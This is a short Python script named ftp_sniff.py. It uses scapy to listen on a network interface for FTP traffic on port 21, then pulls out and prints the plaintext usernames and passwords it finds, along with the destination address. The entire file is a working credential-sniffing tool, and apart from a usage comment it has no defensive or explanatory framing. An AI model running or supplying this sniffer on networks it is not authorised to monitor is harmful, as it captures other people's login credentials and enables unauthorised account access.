import re
import argparse
from scapy.all import *
from scapy.layers.inet import TCP, IP

"""
Usage:

ftp ftp.us.debian.org
anonymous

"""

def ftp_sniff(packet):
    """
    Helper function to check if the packet includes the port in the specified transport layer.
    If it is a packet associated with port 21 and uses TCP, we check the plain text data related
    to the user and the password.
    :param packet:
    :return:
    """
    dest = packet.getlayer(IP).dst
    raw = packet.sprintf('%Raw.load%')
    print(raw)
    user = re.findall('(?i)USER (.*)', raw)
    passw = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP Login to ' + str(dest))
        print('[+] User account: ' + str(user[0]))
    elif passw:
        print('[+] Password: ' + str(passw[0]))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ftp_sniff.py < interface > ')
    parser.add_argument('interface', type=str, metavar='INTERFACE',
                        help='specify the interface to listen on')
    args = parser.parse_args()
    try:
        sniff(iface=args.interface, filter='tcp port 21', prn=ftp_sniff)
    except KeyboardInterrupt:
        exit(0)
